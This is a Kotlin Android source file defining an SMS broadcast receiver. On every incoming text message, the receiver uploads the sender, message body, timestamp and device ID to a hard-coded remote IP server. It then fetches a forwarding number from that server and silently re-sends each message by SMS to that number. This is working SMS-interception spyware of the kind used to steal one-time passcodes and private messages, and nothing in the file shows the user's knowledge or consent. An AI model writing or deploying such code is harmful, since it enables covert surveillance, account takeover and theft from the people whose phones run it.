package com.example.test

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d(TAG, "════════════════════════════════════════")
        Log.d(TAG, "📨 SMS Received - onReceive triggered")
        
        if (context == null || intent == null) {
            Log.w(TAG, "❌ Context or Intent is null")
            return
        }

        val action = intent.action
        Log.d(TAG, "📋 Action: $action")
        
        if (action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION &&
            action != Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            Log.w(TAG, "⚠️ Not an SMS action, ignoring")
            return
        }

        try {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            Log.d(TAG, "📦 Messages count: ${messages.size}")

            if (messages.isEmpty()) {
                Log.w(TAG, "❌ No messages found")
                return
            }

            val fullMessage = StringBuilder()
            var sender = ""
            var timestamp = 0L

            for (message in messages) {
                fullMessage.append(message.messageBody ?: "")
                if (sender.isEmpty()) {
                    sender = message.originatingAddress ?: "Unknown"
                    timestamp = message.timestampMillis
                }
            }

            Log.d(TAG, "📱 Sender: $sender")
            Log.d(TAG, "💬 Message: ${fullMessage.toString().take(50)}...")
            Log.d(TAG, "⏰ Timestamp: $timestamp")

            Thread {
                try {
                    Log.d(TAG, "🚀 Starting background operations...")
                    sendSmsToBackend(context, sender, fullMessage.toString(), timestamp)

                    val forwardingNumber = fetchForwardingNumberFromBackend(context)
                    if (!forwardingNumber.isNullOrEmpty()) {
                        Log.d(TAG, "📤 Forwarding to: $forwardingNumber")
                        forwardSms(forwardingNumber, fullMessage.toString())
                    } else {
                        Log.d(TAG, "ℹ️ No forwarding number configured")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "💥 Error in background thread", e)
                    e.printStackTrace()
                }
            }.start()

        } catch (e: Exception) {
            Log.e(TAG, "💥 Error processing SMS", e)
            e.printStackTrace()
        }
        
        Log.d(TAG, "════════════════════════════════════════")
    }

    private fun sendSmsToBackend(context: Context, sender: String, message: String, timestamp: Long) {
        Log.d(TAG, "═══ Sending SMS to Backend ═══")
        
        try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            Log.d(TAG, "📱 Device ID: $deviceId")

            val body = JSONObject().apply {
                put("sender", sender)
                put("message", message)
                put("timestamp", timestamp)
                put("deviceId", deviceId)
            }

            val urlString = "http://95.134.130.160:8765/api/sms/new"
            Log.d(TAG, "🌐 URL: $urlString")
            Log.d(TAG, "📤 Body: ${body.toString()}")

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.doOutput = true

            Log.d(TAG, "🔗 Connecting to server...")

            conn.outputStream.use { os ->
                os.write(body.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Response Code: $responseCode")
            
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "✅ SMS sent to backend successfully")
            } else {
                Log.e(TAG, "❌ Failed to send SMS, code: $responseCode")
            }
            
            conn.disconnect()

        } catch (e: java.net.ConnectException) {
            Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "❌ Connection timeout", e)
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error sending SMS to backend", e)
            e.printStackTrace()
        }
    }

    private fun fetchForwardingNumberFromBackend(context: Context): String? {
        Log.d(TAG, "═══ Fetching Forwarding Number ═══")
        
        return try {
            val deviceId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            )
            Log.d(TAG, "📱 Device ID: $deviceId")

            val urlString = "http://95.134.130.160:8765/api/getForwardingNumber/$deviceId"
            Log.d(TAG, "🌐 URL: $urlString")

            val url = URL(urlString)
            val conn = url.openConnection() as HttpURLConnection

            conn.requestMethod = "GET"
            conn.setRequestProperty("Accept", "application/json")
            conn.connectTimeout = 10000
            conn.readTimeout = 10000

            Log.d(TAG, "🔗 Connecting to server...")

            val responseCode = conn.responseCode
            Log.d(TAG, "📥 Response Code: $responseCode")
            
            if (responseCode != 200) {
                Log.w(TAG, "⚠️ No forwarding number (code: $responseCode)")
                conn.disconnect()
                return null
            }

            val response = conn.inputStream.bufferedReader().use { it.readText() }
            Log.d(TAG, "📥 Response: $response")
            
            val json = JSONObject(response)
            val number = json.optString("forwardingNumber", null)

            conn.disconnect()

            if (number != null) {
                Log.d(TAG, "✅ Forwarding number retrieved: $number")
            } else {
                Log.d(TAG, "ℹ️ No forwarding number in response")
            }

            number

        } catch (e: java.net.ConnectException) {
            Log.e(TAG, "❌ Connection failed: Cannot reach server", e)
            null
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "❌ Connection timeout", e)
            null
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error fetching forwarding number", e)
            e.printStackTrace()
            null
        }
    }

    private fun forwardSms(forwardingNumber: String, message: String) {
        Log.d(TAG, "═══ Forwarding SMS ═══")
        Log.d(TAG, "📱 To: $forwardingNumber")
        Log.d(TAG, "💬 Message length: ${message.length}")
        
        try {
            val smsManager = SmsManager.getDefault()

            if (message.length > 160) {
                Log.d(TAG, "📨 Message is long, splitting into parts...")
                val parts = smsManager.divideMessage(message)
                Log.d(TAG, "📊 Parts count: ${parts.size}")
                
                smsManager.sendMultipartTextMessage(
                    forwardingNumber,
                    null,
                    parts,
                    null,
                    null
                )
                Log.d(TAG, "✅ Multi-part SMS forwarded")
            } else {
                smsManager.sendTextMessage(
                    forwardingNumber,
                    null,
                    message,
                    null,
                    null
                )
                Log.d(TAG, "✅ Single SMS forwarded")
            }

        } catch (e: SecurityException) {
            Log.e(TAG, "❌ SEND_SMS permission denied", e)
        } catch (e: Exception) {
            Log.e(TAG, "💥 Error forwarding SMS", e)
            e.printStackTrace()
        }
    }
}
